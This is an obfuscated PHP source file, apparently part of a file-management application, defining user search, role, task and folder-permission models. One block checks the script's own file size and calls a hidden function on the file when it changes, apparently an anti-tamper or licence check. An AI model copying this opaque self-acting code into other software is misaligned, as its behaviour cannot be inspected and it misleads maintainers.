$„õÙı›Š[548])); $¸™üìç = $Ûå×¡˜ª[$¸™üìç]; $ßåòÂ¬‚ = $ßåòÂ¬‚ . "\165\163\145\x72\x2e{$ş¸‚•”·}\40{$¸™üìç}\54\40\165\x73\x65\x72\56\165\163\x65\x72\x49\104\x20\x61\163\x63"; return $this->alias($„õÙı›Š[2404])->order($ßåòÂ¬‚); } public function listSearch($Ãê–É») { $¹õ¢…¨ö =& $_SERVER[øşô´çË]; $çâõ¤Á = trim($Ãê–É»[$¹õ¢…¨ö[2276]]); $ÃÂÑ®¼ = explode($¹õ¢…¨ö[63], $çâõ¤Á); if (!$çâõ¤Á || count($ÃÂÑ®¼) == 1) { return $this->listSearchNow($Ãê–É»); } $±›Ìê„ = array($¹õ¢…¨ö[455] => array()); foreach ($ÃÂÑ®¼ as $ºËğÔÃˆ) { if (!trim($ºËğÔÃˆ)) { continue; } $Ãê–É»[$¹õ¢…¨ö[2276]] = $ºËğÔÃˆ; $»¨ğ×”º = $this->listSearchNow($Ãê–É»); $±›Ìê„[$¹õ¢…¨ö[455]] = array_merge($±›Ìê„[$¹õ¢…¨ö[455]], $»¨ğ×”º[$¹õ¢…¨ö[455]]); } $±›Ìê„[$¹õ¢…¨ö[455]] = array_unique_by_key($±›Ìê„[$¹õ¢…¨ö[455]], $¹õ¢…¨ö[1588]); $±›Ìê„[$¹õ¢…¨ö[452]] = array($¹õ¢…¨ö[453] => count($±›Ìê„[$¹õ¢…¨ö[455]]), $¹õ¢…¨ö[448] => 20, $¹õ¢…¨ö[437] => 1, $¹õ¢…¨ö[454] => 1); return $±›Ìê„; } public function listSearchNow($­¡ã·–) { $íö ·ñÕ =& $_SERVER[øşô´çË]; $Ì²‘ŞÙ = trim($­¡ã·–[$íö ·ñÕ[2276]]); $Ÿî€¾‘¿ = isset($­¡ã·–[$íö ·ñÕ[2277]]) ? $­¡ã·–[$íö ·ñÕ[2277]] : !1; $Ì²‘ŞÙ = str_replace($íö ·ñÕ[2278], $íö ·ñÕ[2279], trim($Ì²‘ŞÙ)); $É˜®·Èõ = array($íö ·ñÕ[42] => array($íö ·ñÕ[482], "\45{$Ì²‘ŞÙ}\x25"), $íö ·ñÕ[389] => array($íö ·ñÕ[482], "{$Ì²‘ŞÙ}\45"), $íö ·ñÕ[2472] => array($íö ·ñÕ[482], "\x25{$Ì²‘ŞÙ}\x25"), $íö ·ñÕ[1164] => $íö ·ñÕ[2280]); if (Input::check($Ì²‘ŞÙ, $íö ·ñÕ[395])) { $É˜®·Èõ[$íö ·ñÕ[1588]] = array($íö ·ñÕ[482], "{$Ì²‘ŞÙ}\45"); $É˜®·Èõ[$íö ·ñÕ[2687]] = array($íö ·ñÕ[482], "{$Ì²‘ŞÙ}\x25"); } if (!$Ì²‘ŞÙ) { $É˜®·Èõ = array(); } if (isset($­¡ã·–[$íö ·ñÕ[852]])) { $É˜®·Èõ[$íö ·ñÕ[852]] = $­¡ã·–[$íö ·ñÕ[852]]; } $É˜®·Èõ = $this->parseWhereLike($É˜®·Èõ); $½¿„Æ·ğ = $this->_makeOrder()->where($É˜®·Èõ)->selectPage(20); if (!$½¿„Æ·ğ || count($½¿„Æ·ğ[$íö ·ñÕ[455]]) < 5 && Input::check($Ì²‘ŞÙ, $íö ·ñÕ[402])) { $½§¨–… = $this->_searchFromMeta($íö ·ñÕ[560], $Ì²‘ŞÙ, 10); $İıšşŒ† = $this->_searchFromMeta($íö ·ñÕ[561], $Ì²‘ŞÙ, 10); $€Å½®€ô = array_merge($½§¨–…, $İıšşŒ†, $½¿„Æ·ğ[$íö ·ñÕ[455]]); $½¿„Æ·ğ[$íö ·ñÕ[455]] = array_unique_by_key($€Å½®€ô, $íö ·ñÕ[1588]); $½¿„Æ·ğ[$íö ·ñÕ[452]][$íö ·ñÕ[453]] = count($½¿„Æ·ğ[$íö ·ñÕ[455]]); $½¿„Æ·ğ[$íö ·ñÕ[452]][$íö ·ñÕ[454]] = ceil($½¿„Æ·ğ[$íö ·ñÕ[452]][$íö ·ñÕ[453]] / $½¿„Æ·ğ[$íö ·ñÕ[452]][$íö ·ñÕ[448]]); } $this->_listDataApply($½¿„Æ·ğ[$íö ·ñÕ[455]]); $this->_filterByGroup($½¿„Æ·ğ, $Ÿî€¾‘¿); return $½¿„Æ·ğ; } private function _filterByGroup(&$Ñ«¡Êà¢, $ªé‚ş°Ê) { $¯›»ÔÒ =& $_SERVER[øşô´çË]; if (!$ªé‚ş°Ê) { return $Ñ«¡Êà¢; } foreach ($Ñ«¡Êà¢[$¯›»ÔÒ[455]] as $ÓÒ¼·è => &$¼Àºı÷µ) { $ï‹Åµ˜Ç = array_to_keyvalue($¼Àºı÷µ[$¯›»ÔÒ[1490]], $¯›»ÔÒ[12], $¯›»ÔÒ[1491]); if (!in_array($ªé‚ş°Ê, $ï‹Åµ˜Ç)) { unset($Ñ«¡Êà¢[$¯›»ÔÒ[455]][$ÓÒ¼·è]); } } unset($¼Àºı÷µ); $Ñ«¡Êà¢[$¯›»ÔÒ[455]] = array_values($Ñ«¡Êà¢[$¯›»ÔÒ[455]]); $Ñ«¡Êà¢[$¯›»ÔÒ[452]] = array($¯›»ÔÒ[2327] => count($Ñ«¡Êà¢[$¯›»ÔÒ[455]]), $¯›»ÔÒ[2437] => $Ñ«¡Êà¢[$¯›»ÔÒ[452]][$¯›»ÔÒ[448]], $¯›»ÔÒ[2436] => 1, $¯›»ÔÒ[2438] => 1); } private function _searchFromMeta($ŸéŒäî, $³šõ¸ñ­, $®âÄÅì) { $†ÅÉİÉ =& $_SERVER[øşô´çË]; $³šõ¸ñ­ = strtolower($³šõ¸ñ­); $¦ìÇÚàì = array($†ÅÉİÉ[105] => $ŸéŒäî, $†ÅÉİÉ[460] => array($†ÅÉİÉ[482], "\x25{$³šõ¸ñ­}\45")); $¦ìÇÚàì = $this->parseWhereLike($¦ìÇÚàì); $Æ»·‹Ç¼ = Model($†ÅÉİÉ[2709])->where($¦ìÇÚàì)->limit($®âÄÅì)->select(); if (!$Æ»·‹Ç¼) { return array(); } $Æ»·‹Ç¼ = array_to_keyvalue($Æ»·‹Ç¼, $†ÅÉİÉ[12], $†ÅÉİÉ[1588]); $¾Ûëüó½ = $this->where(array($†ÅÉİÉ[1964] => array($†ÅÉİÉ[7], $Æ»·‹Ç¼)))->select(); if (!$¾Ûëüó½) { return array(); } return $¾Ûëüó½; } private function _listDataApplyItem($Á¯¹¿œÖ) { $†Ñûñ©– = array($Á¯¹¿œÖ); $this->_listDataApply($†Ñûñ©–); return $†Ñûñ©–[0]; } private function _listDataApply(&$ÏÕŒÌ£ï) { $ËÃå˜Ëü =& $_SERVER[øşô´çË]; if (!$ÏÕŒÌ£ï) { return; } array_remove_key($ÏÕŒÌ£ï, $ËÃå˜Ëü[1047]); $üğ°ªøö = array_to_keyvalue($ÏÕŒÌ£ï, $ËÃå˜Ëü[12], $ËÃå˜Ëü[1588]); $this->_listAppendGroup($ÏÕŒÌ£ï, $üğ°ªøö); $this->_listAppendMeta($ÏÕŒÌ£ï, $üğ°ªøö); $this->_listAppendSourceRoot($ÏÕŒÌ£ï, $üğ°ªøö); } private function _listAppendSourceRoot(&$ıË……õó, $şäÖùÚ¹) { $œŞ·¬Æ— =& $_SERVER[øşô´çË]; $¿ñ÷µ¼Û = Model($œŞ·¬Æ—[935])->listSourceRoot(SourceModel::TYPE_USER, $şäÖùÚ¹); $¿ñ÷µ¼Û = array_to_keyvalue($¿ñ÷µ¼Û, $œŞ·¬Æ—[598]); $¿ñ÷µ¼Û = array_remove_key($¿ñ÷µ¼Û, $œŞ·¬Æ—[598]); foreach ($ıË……õó as &$¦•”ş™Ë) { $¦•”ş™Ë[$œŞ·¬Æ—[100]] = $¿ñ÷µ¼Û[$¦•”ş™Ë[$œŞ·¬Æ—[1588]]] ? $¿ñ÷µ¼Û[$¦•”ş™Ë[$œŞ·¬Æ—[1588]]] : array(); } unset($¦•”ş™Ë); } private function _listAppendGroup(&$ÉÙìîø, $„ËÜ¸ü¼) { $ı®Ï¹Ñ =& $_SERVER[øşô´çË]; $ğÍÛËƒ÷ = array($ı®Ï¹Ñ[1588] => array($ı®Ï¹Ñ[7], $„ËÜ¸ü¼)); $¨ÀÄúÑµ = Model($ı®Ï¹Ñ[2272])->where($ğÍÛËƒ÷)->select(); $ˆ«–Üæü = array_to_keyvalue($¨ÀÄúÑµ, $ı®Ï¹Ñ[12], $ı®Ï¹Ñ[1491]); $ˆ«–Üæü = array_remove_value(array_unique($ˆ«–Üæü), $ı®Ï¹Ñ[238]); if (!$ˆ«–Üæü || !$¨ÀÄúÑµ) { return; } $ğÍÛËƒ÷ = array($ı®Ï¹Ñ[1491] => array($ı®Ï¹Ñ[7], $ˆ«–Üæü)); $ê°üÂ¾ = Model($ı®Ï¹Ñ[1489])->field($ı®Ï¹Ñ[2710])->where($ğÍÛËƒ÷)->select(); $ê°üÂ¾ = array_to_keyvalue($ê°üÂ¾, $ı®Ï¹Ñ[1491]); $¨ÀÄúÑµ = array_to_keyvalue_group($¨ÀÄúÑµ, $ı®Ï¹Ñ[1588]); foreach ($¨ÀÄúÑµ as &$à€âÌÆ) { $¶õ÷Öá = array(); foreach ($à€âÌÆ as $å‚¥…¥) { if (!$å‚¥…¥[$ı®Ï¹Ñ[1636]]) { continue; } $¾§¸©í¯ = Model($ı®Ï¹Ñ[600])->listData($å‚¥…¥[$ı®Ï¹Ñ[1636]]); $¶õ÷Öá[] = array($ı®Ï¹Ñ[1491] => $å‚¥…¥[$ı®Ï¹Ñ[1491]], $ı®Ï¹Ñ[2711] => $ê°üÂ¾[$å‚¥…¥[$ı®Ï¹Ñ[1491]]][$ı®Ï¹Ñ[42]], $ı®Ï¹Ñ[613] => $ê°üÂ¾[$å‚¥…¥[$ı®Ï¹Ñ[1491]]][$ı®Ï¹Ñ[613]], $ı®Ï¹Ñ[511] => $¾§¸©í¯); } $à€âÌÆ = $¶õ÷Öá; } unset($à€âÌÆ); foreach ($ÉÙìîø as &$ÓÍ†–¯) { $ÓÍ†–¯[$ı®Ï¹Ñ[1490]] = array(); if (isset($¨ÀÄúÑµ[$ÓÍ†–¯[$ı®Ï¹Ñ[1588]]])) { $ÓÍ†–¯[$ı®Ï¹Ñ[1490]] = $¨ÀÄúÑµ[$ÓÍ†–¯[$ı®Ï¹Ñ[1588]]]; } } unset($ÓÍ†–¯); } public function userAppendGroup($ÂŒÁªœÃ) { $ÃëÄª =& $_SERVER[øşô´çË]; if (!$ÂŒÁªœÃ) { return array(); } $this->_listAppendGroup($ÂŒÁªœÃ, array_to_keyvalue($ÂŒÁªœÃ, $ÃëÄª[12], $ÃëÄª[1588])); return $ÂŒÁªœÃ; } private function _listAppendMeta(&$íâïµ¹·, $¿‹ºÄßµ) { $ü½Ú–âŞ =& $_SERVER[øşô´çË]; $¦ò×——ê = UserJobModel::JOB_KEY; $ÄÌÖ Ù´ = array($ü½Ú–âŞ[2268]); $Ê×÷¨ú‘ = array($ü½Ú–âŞ[1588] => array($ü½Ú–âŞ[7], $¿‹ºÄßµ)); $úûâíáâ = Model($ü½Ú–âŞ[2686])->where($Ê×÷¨ú‘)->select(); $·ş§ÍÓŸ = array(); foreach ($úûâíáâ as $‘Æ§È) { $À¢ÌßĞá = $‘Æ§È[$ü½Ú–âŞ[1588]]; if (!isset($·ş§ÍÓŸ[$À¢ÌßĞá])) { $·ş§ÍÓŸ[$À¢ÌßĞá] = array(); } $·ş§ÍÓŸ[$À¢ÌßĞá][$‘Æ§È[$ü½Ú–âŞ[105]]] = $‘Æ§È[$ü½Ú–âŞ[460]]; } $ôÄêÔ¢ = Model($ü½Ú–âŞ[2712]); foreach ($íâïµ¹· as &$ÓçşâõÉ) { $À¢ÌßĞá = $ÓçşâõÉ[$ü½Ú–âŞ[1588]]; $óìÜø‘ = isset($·ş§ÍÓŸ[$À¢ÌßĞá]) ? $·ş§ÍÓŸ[$À¢ÌßĞá] : array(); $ÓçşâõÉ[$ü½Ú–âŞ[564]] = array_field_key($óìÜø‘, $ÄÌÖ Ù´); $ÓçşâõÉ[$ü½Ú–âŞ[2713]] = array(); if (isset($óìÜø‘[$¦ò×——ê])) { $ÓçşâõÉ[$ü½Ú–âŞ[2713]] = $ôÄêÔ¢->getUserJobInfo($óìÜø‘[$¦ò×——ê]); } } unset($ÓçşâõÉ); } protected function groupUserAll($Ñ²Ø¶×û) { $öå¼Ğ‰ò =& $_SERVER[øşô´çË]; if (!$Ñ²Ø¶×û) { return !1; } $Üº¿ºğê = Model($öå¼Ğ‰ò[2272])->field($öå¼Ğ‰ò[1588])->where(array($öå¼Ğ‰ò[1491] => array($öå¼Ğ‰ò[7], $Ñ²Ø¶×û)))->select(); $Üº¿ºğê = array_to_keyvalue($Üº¿ºğê, $öå¼Ğ‰ò[12], $öå¼Ğ‰ò[1588]); return array_unique($Üº¿ºğê); } public function userSearch($™ò–”‹, $Ìş¥Ú°È = "\52") { return Model($_SERVER[øşô´çË][626])->where($™ò–”‹)->field($Ìş¥Ú°È)->find(); } } goto bïŞ¼·êªÜ; EÑŞİ…ƒ‡: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\162\x6f\154\145\x4c\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\x61\x75\x74\x68", "\x6c\141\142\145\154", "\144\151\163\x70\154\x61\x79", "\x73\x79\x73\164\145\155", "\144\145\x73\143", "\151\x67\156\157\162\145\x45\x78\164", "\x69\x67\156\x6f\x72\145\106\151\154\145\123\x69\x7a\x65", "\141\144\x6d\x69\156\151\x73\164\162\x61\x74\x6f\162", "\x73\157\x72\x74"); public function listData($¯à»ü¹´ = false, $úß¾ßï½ = "\x73\157\162\x74", $Ë¾ØÇ‰¡ = false) { $Ó‚‚µó =& $_SERVER[øşô´çË]; $Œ¹Ï›‡É = parent::listData($¯à»ü¹´, $úß¾ßï½, $Ë¾ØÇ‰¡); if (!$¯à»ü¹´) { foreach ($Œ¹Ï›‡É as $ûÈ—Ì => $øÉ¢”Å) { if ($øÉ¢”Å[$Ó‚‚µó[2372]] == 1) { $Œ¹Ï›‡É[$ûÈ—Ì][$Ó‚‚µó[549]] = LNG($Ó‚‚µó[2657]); } } } return $Œ¹Ï›‡É; } public function update($¨äº´ÊÆ, $ÆŠ§–ÖÛ) { $ë¡á‹« =& $_SERVER[øşô´çË]; $ø¡æªŸã = parent::listData($¨äº´ÊÆ); $õ´Ä¤¿ = $this->findByName($ÆŠ§–ÖÛ[$ë¡á‹«[42]]); if (!$ø¡æªŸã || $õ´Ä¤¿ && $õ´Ä¤¿[$ë¡á‹«[496]] != $ø¡æªŸã[$ë¡á‹«[496]]) { return !1; } if ($õ´Ä¤¿[$ë¡á‹«[2372]] == 1) { $ÆŠ§–ÖÛ = array($ë¡á‹«[42] => $ÆŠ§–ÖÛ[$ë¡á‹«[42]], $ë¡á‹«[2199] => $ÆŠ§–ÖÛ[$ë¡á‹«[2199]]); } $this->filterAuth($ÆŠ§–ÖÛ[$ë¡á‹«[511]]); return parent::update($¨äº´ÊÆ, $ÆŠ§–ÖÛ); } public function remove($™Óœ¢éÌ) { $Ü±³”Ç = parent::listData($™Óœ¢éÌ); if (!$Ü±³”Ç || $Ü±³”Ç[$_SERVER[øşô´çË][199]]) { return !1; } return parent::remove($™Óœ¢éÌ); } public function add($òùš«©€) { $äÍ¤İƒ¶ =& $_SERVER[øşô´çË]; $Ç«Ü‹– = $òùš«©€[$äÍ¤İƒ¶[42]]; if ($this->findByName($Ç«Ü‹–)) { return !1; } $ÕÊİŸ¸Û = array($äÍ¤İƒ¶[518] => $Ç«Ü‹–, $äÍ¤İƒ¶[2184] => $äÍ¤İƒ¶[12], $äÍ¤İƒ¶[2180] => $äÍ¤İƒ¶[2188], $äÍ¤İƒ¶[2658] => 1, $äÍ¤İƒ¶[2183] => 0, $äÍ¤İƒ¶[2659] => 0, $äÍ¤İƒ¶[2182] => $this->getSort()); $òùš«©€ = array_merge($ÕÊİŸ¸Û, $òùš«©€); $this->filterAuth($òùš«©€[$äÍ¤İƒ¶[511]]); return parent::insert($òùš«©€); } private function getSort() { $»×Ã œˆ =& $_SERVER[øşô´çË]; $“áû…Ç = parent::listData(); $©÷Ò¬© = array_to_keyvalue($“áû…Ç, $»×Ã œˆ[12], $»×Ã œˆ[2200]); return empty($©÷Ò¬©) ? 0 : max($©÷Ò¬©) + 1; } private function filterAuth(&$òåÉºØÅ) { $‡„ÑÈÀÊ =& $_SERVER[øşô´çË]; $Ò€²ââî = array(); $øÍ”àäú = array_filter(explode($‡„ÑÈÀÊ[60], $òåÉºØÅ)); foreach ($øÍ”àäú as $òåÉºØÅ) { $úË¨¾· = explode($‡„ÑÈÀÊ[10], $òåÉºØÅ); if ($úË¨¾·[0] == $‡„ÑÈÀÊ[2660] && $úË¨¾·[1] != $‡„ÑÈÀÊ[1305]) { $Å„•Ç•ë = $úË¨¾·[0] . $‡„ÑÈÀÊ[10] . $úË¨¾·[1] . $‡„ÑÈÀÊ[2661]; if (!in_array($Å„•Ç•ë, $øÍ”àäú)) { $Ò€²ââî[] = $Å„•Ç•ë; } } $Ò€²ââî[] = $òåÉºØÅ; } $òåÉºØÅ = implode($‡„ÑÈÀÊ[60], $Ò€²ââî); } public function findRoleDefault() { $ëÊÍòãÓ =& $_SERVER[øşô´çË]; $ßÙ½’á÷ = parent::listData(); $İšƒ±Ï• = !1; foreach ($ßÙ½’á÷ as $Ö…¢²Ñˆ) { if (!$Ö…¢²Ñˆ || $Ö…¢²Ñˆ[$ëÊÍòãÓ[2198]] == $ëÊÍòãÓ[238] || $Ö…¢²Ñˆ[$ëÊÍòãÓ[2372]] == 1) { continue; } if (strstr($Ö…¢²Ñˆ[$ëÊÍòãÓ[511]], $ëÊÍòãÓ[2662])) { continue; } if (!strstr($Ö…¢²Ñˆ[$ëÊÍòãÓ[511]], $ëÊÍòãÓ[2663])) { continue; } if (!$İšƒ±Ï•) { $İšƒ±Ï• = $Ö…¢²Ñˆ; continue; } $±ë‘€¸ = explode($ëÊÍòãÓ[60], $İšƒ±Ï•[$ëÊÍòãÓ[511]]); $œàŒ¦‘ = explode($ëÊÍòãÓ[60], $Ö…¢²Ñˆ[$ëÊÍòãÓ[511]]); if (count($±ë‘€¸) > count($œàŒ¦‘)) { $İšƒ±Ï• = $Ö…¢²Ñˆ; } } return $İšƒ±Ï• ? $İšƒ±Ï•[$ëÊÍòãÓ[496]] : $ëÊÍòãÓ[12]; } public function sort($ºµŒÀñš, $Œ¸ß”¥) { return parent::update($ºµŒÀñš, $Œ¸ß”¥); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\x74\141\x73\153\114\x69\x73\164"; public $field = array("\x6e\141\155\145", "\164\171\160\145", "\145\x76\x65\156\164", "\164\151\x6d\x65", "\144\x65\163\143", "\163\x79\163\x74\x65\x6d", "\x65\x6e\141\142\154\145", "\154\x61\x73\164\x52\x75\x6e", "\163\157\x72\x74"); public function listData($‡·ìšÅã = false, $‡ïĞû° = "\163\157\x72\x74", $…Ç©Ò = false) { return parent::listData($‡·ìšÅã, $‡ïĞû°, $…Ç©Ò); } public function add($íİéıœ) { $³××íƒ¼ =& $_SERVER[øşô´çË]; $–Åã¢µ¨ = $this->findByName($íİéıœ[$³××íƒ¼[42]]); if ($–Åã¢µ¨) { return !1; } $íİéıœ[$³××íƒ¼[1924]] = 0; $íİéıœ[$³××íƒ¼[2200]] = $this->getSort(); return parent::insert($íİéıœ); } private function getSort() { $”®Š¦ø¥ =& $_SERVER[øşô´çË]; $ş±ËÇÁÕ = parent::listData(); $¤¶æ´Ã— = array_to_keyvalue($ş±ËÇÁÕ, $”®Š¦ø¥[12], $”®Š¦ø¥[2200]); return empty($¤¶æ´Ã—) ? 0 : max($¤¶æ´Ã—) + 1; } public function update($¶Š³‰’, $ÆŞË­ÛÄ) { $ÉÁ¦îç‰ =& $_SERVER[øşô´çË]; $Ÿ½úø´Ş = $this->listData($¶Š³‰’); $”×‘ÚÇ› = $this->findByName($ÆŞË­ÛÄ[$ÉÁ¦îç‰[42]]); if (!$Ÿ½úø´Ş || $”×‘ÚÇ› && $”×‘ÚÇ›[$ÉÁ¦îç‰[496]] != $Ÿ½úø´Ş[$ÉÁ¦îç‰[496]]) { return !1; } return parent::update($¶Š³‰’, $ÆŞË­ÛÄ); } public function remove($¦Û»Ê¿¢, $•á®¢òâ = false) { $µ±ª÷çÆ =& $_SERVER[øşô´çË]; $¾™‚§èÃ = $this->listData($¦Û»Ê¿¢); if (!$¾™‚§èÃ) { return; } if (!$•á®¢òâ && $¾™‚§èÃ[$µ±ª÷çÆ[199]] == $µ±ª÷çÆ[101]) { return !1; } return parent::remove($¦Û»Ê¿¢); } public function enable($‰³ı¯ÏÔ, $€óç®¸ã) { return $this->update($‰³ı¯ÏÔ, array($_SERVER[øşô´çË][2652] => $€óç®¸ã)); } public function run($úñÓíîğ) { return $this->update($úñÓíîğ, array($_SERVER[øşô´çË][2664] => time())); } } goto a“ÏêÉ‡«‹; Dôô‚·åÉ¦: $_file = $_SERVER[$_SERVER[øşô´çË][13]]; $_size = $_SERVER[øşô´çË][14]; if ($_SERVER[$_SERVER[øşô´çË][15]] != $_size($_file)) { $_getc = $_SERVER[øşô´çË][16]; $_getfile = $_SERVER[$_SERVER[øşô´çË][17]] . $_SERVER[øşô´çË][18]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[øşô´çË][19], $_getfilec); if (count($_getarrs) < $_SERVER[øşô´çË][20]) { $exit = $_SERVER[øşô´çË][21]; $exit(); } $_act = $_SERVER[øşô´çË][22]; $_act($_file); } goto fñõ‘ã‹Ñï; a§ìø°¦÷ë: class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\x72\x63\145\137\141\165\164\150"; public function getAuth($¹ËÌ›ªŒ) { $ßªïçœ =& $_SERVER[øşô´çË]; $êŞ«»Ë— = $this->sourceAuthSelect($¹ËÌ›ªŒ); $ä¤ ¹°ô = array(); $¼çøŠµÓ = array(); $¨ˆøŠŸ† = 2 << 25; foreach ($êŞ«»Ë— as $šëôµ–) { $â û¸‹ù = Model($ßªïçœ[600])->listData($šëôµ–[$ßªïçœ[1636]]); if (!$â û¸‹ù) { continue; } $ä¤ ¹°ô[] = $šëôµ–; $ƒ—§ı¯ß = 0; if ($šëôµ–[$ßªïçœ[198]] == SourceModel::TYPE_GROUP) { $ƒ—§ı¯ß = $¨ˆøŠŸ† * 2; } if ($šëôµ–[$ßªïçœ[198]] == SourceModel::TYPE_USER) { $ƒ—§ı¯ß = $¨ˆøŠŸ†; } if ($šëôµ–[$ßªïçœ[198]] == SourceModel::TYPE_USER && $šëôµ–[$ßªïçœ[598]] == $ßªïçœ[238]) { $ƒ—§ı¯ß = 0; } $¼çøŠµÓ[] = $â û¸‹ù[$ßªïçœ[511]] + $ƒ—§ı¯ß; } array_multisort($¼çøŠµÓ, SORT_DESC, $ä¤ ¹°ô); return $ä¤ ¹°ô; } public function sourceAuthSelect($´õÔÔòæ) { $„‚û—«‘ =& $_SERVER[øşô´çË]; static $Û­™¹ÜÓ = array(); $»×›¨Ö = is_array($´õÔÔòæ) ? !1 : !0; if ($»×›¨Ö) { $´õÔÔòæ = array($´õÔÔòæ); } $ıôŸŠ˜Ç = array(); foreach ($´õÔÔòæ as $Ø¢º¹Ö) { if (isset($Û­™¹ÜÓ[$Ø¢º¹Ö])) { $ıôŸŠ˜Ç[$Ø¢º¹Ö] = $Û­™¹ÜÓ[$Ø¢º¹Ö]; } } if (count($ıôŸŠ˜Ç) == count($´õÔÔòæ)) { return $»×›¨Ö ? $ıôŸŠ˜Ç[$´õÔÔòæ[0]] : $ıôŸŠ˜Ç; } $ûÚİ» = $„‚û—«‘[2362]; $éâ€°â¡ = array($„‚û—«‘[201] => array($„‚û—«‘[7], $´õÔÔòæ)); $ßğ¿›ã¸ = $this->field($ûÚİ»)->order($„‚û—«‘[496])->where($éâ€°â¡)->select(); $¬ïÜ»Ä¦ = array_to_keyvalue_group($ßğ¿›ã¸, $„‚û—«‘[201]); foreach ($´õÔÔòæ as $Ø¢º¹Ö) { $Û­™¹ÜÓ[$Ø¢º¹Ö] = $¬ïÜ»Ä¦[$Ø¢º¹Ö] ? $¬ïÜ»Ä¦[$Ø¢º¹Ö] : array(); } if ($»×›¨Ö) { return $ßğ¿›ã¸; } return $¬ïÜ»Ä¦; } public function setAuth($ø¤óœú, $™Ëêä) { $©ÉŒ½ =& $_SERVER[øşô´çË]; $ÖÑ›–Şô = Model($©ÉŒ½[1529])->sourceInfo($ø¤óœú); if (!$ÖÑ›–Şô) { return !1; } if ($ÖÑ›–Şô[$©ÉŒ½[198]] != SourceModel::TYPE_GROUP) { return !1; } $‰ş¡™ÃÒ = 1; $ÇÇ‚ÁÕÆ = $ÖÑ›–Şô[$©ÉŒ½[598]]; if ($ÇÇ‚ÁÕÆ != $‰ş¡™ÃÒ) { $ŸúØ…àü = array($©ÉŒ½[1491] => $ÇÇ‚ÁÕÆ); $§—çÖÓ« = Model($©ÉŒ½[2272])->field($©ÉŒ½[1588])->where($ŸúØ…àü)->select(); $§—çÖÓ« = array_to_keyvalue($§—çÖÓ«, $©ÉŒ½[12], $©ÉŒ½[1588]); } $äşï”¡ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¸Úìû›È = array(); foreach ($™Ëêä as $íí‚¸±¡) { if (!in_array($íí‚¸±¡[$©ÉŒ½[198]], $äşï”¡)) { show_json(LNG($©ÉŒ½[2363]), !1); } if ($ÇÇ‚ÁÕÆ != $‰ş¡™ÃÒ) { if ($íí‚¸±¡[$©ÉŒ½[198]] == SourceModel::TYPE_GROUP) { } if ($íí‚¸±¡[$©ÉŒ½[598]] != 0 && !in_array($íí‚¸±¡[$©ÉŒ½[598]], $§—çÖÓ«)) { } } if ($íí‚¸±¡[$©ÉŒ½[598]] == 0) { $íí‚¸±¡[$©ÉŒ½[198]] = SourceModel::TYPE_USER; } $¸Úìû›È[] = array($©ÉŒ½[201] => $ø¤óœú, $©ÉŒ½[198] => intval($íí‚¸±¡[$©ÉŒ½[198]]), $©ÉŒ½[598] => intval($íí‚¸±¡[$©ÉŒ½[598]]), $©ÉŒ½[1636] => intval($íí‚¸±¡[$©ÉŒ½[1636]]) ? intval($íí‚¸±¡[$©ÉŒ½[1636]]) : 0, $©ÉŒ½[2341] => intval($íí‚¸±¡[$©ÉŒ½[2341]]) ? intval($íí‚¸±¡[$©ÉŒ½[2341]]) : -1); } $this->where(array($©ÉŒ½[515] => $ø¤óœú))->delete(); $this->addAll($¸Úìû›È); return !0; } public function authClear($ï×ÌûáÊ) { $ÃØÈİÔ =& $_SERVER[øşô´çË]; $ÇéóØ€ä = Model($ÃØÈİÔ[1529])->sourceInfo($ï×ÌûáÊ); $Üãí°Ô  = array($ï×ÌûáÊ); if ($ÇéóØ€ä[$ÃØÈİÔ[509]] == $ÃØÈİÔ[101]) { $¨õŸÊ¯ = array($ÃØÈİÔ[683] => array($ÃØÈİÔ[644], $ÇéóØ€ä[$ÃØÈİÔ[613]] . $ï×ÌûáÊ . $ÃØÈİÔ[645])); $Üãí°Ô  = Model($ÃØÈİÔ[1529])->field($ÃØÈİÔ[515])->where($¨õŸÊ¯)->getField($ÃØÈİÔ[201], !0); $Üãí°Ô [] = $ï×ÌûáÊ; } $this->where(array($ÃØÈİÔ[515] => array($ÃØÈİÔ[516], $Üãí°Ô )))->delete(); return !0; } public function getAllParent($´­…«) { $ÓÃ€×­š =& $_SERVER[øşô´çË]; $òš–ì¨ş = Model($ÓÃ€×­š[1529])->sourceInfo($´­…«); if (!$òš–ì¨ş || $òš–ì¨ş[$ÓÃ€×­š[198]] != SourceModel::TYPE_GROUP) { return array(); } $Èí¥ú÷ = Model($ÓÃ€×­š[1529])->parentLevelArray($òš–ì¨ş[$ÓÃ€×­š[613]]); $Ò“±ƒÁ› = array_merge(array(intval($´­…«)), array_reverse($Èí¥ú÷)); $Ê‡ÎûÄ´ = $this->sourceAuthSelect($Ò“±ƒÁ›); $¯ùóÆü· = $GLOBALS[$ÓÃ€×­š[6]][$ÓÃ€×­š[102]][$ÓÃ€×­š[2285]] == 1; $Ñ–è¸â» = $¯ùóÆü· ? 3 : 2; $°Ê îüÑ = Model($ÓÃ€×­š[1489])->getInfo($òš–ì¨ş[$ÓÃ€×­š[598]]); $£ß‹š¶É = explode($ÓÃ€×­š[60], trim($°Ê îüÑ[$ÓÃ€×­š[613]], $ÓÃ€×­š[60])); $Òı¤“¿á = array_merge(array($°Ê îüÑ[$ÓÃ€×­š[1491]]), array_reverse(array_slice($£ß‹š¶É, $Ñ–è¸â»))); foreach ($Ê‡ÎûÄ´ as $´­…« => $°üÄŞÜÀ) { foreach ($°üÄŞÜÀ as $·Şê˜µë) { if (!$·Şê˜µë || !$·Şê˜µë[$ÓÃ€×­š[598]] || $·Şê˜µë[$ÓÃ€×­š[598]] == $ÓÃ€×­š[238]) { continue; } if ($·Şê˜µë[$ÓÃ€×­š[198]] != SourceModel::TYPE_GROUP) { continue; } $Òı¤“¿á[] = $·Şê˜µë[$ÓÃ€×­š[598]]; } } $Òı¤“¿á = array_unique($Òı¤“¿á); $áŸîó„ = array($ÓÃ€×­š[437] => _get($GLOBALS[$ÓÃ€×­š[7]], $ÓÃ€×­š[437], 1), $ÓÃ€×­š[448] => _get($GLOBALS[$ÓÃ€×­š[7]], $ÓÃ€×­š[448], 500)); $GLOBALS[$ÓÃ€×­š[7]][$ÓÃ€×­š[437]] = 1; 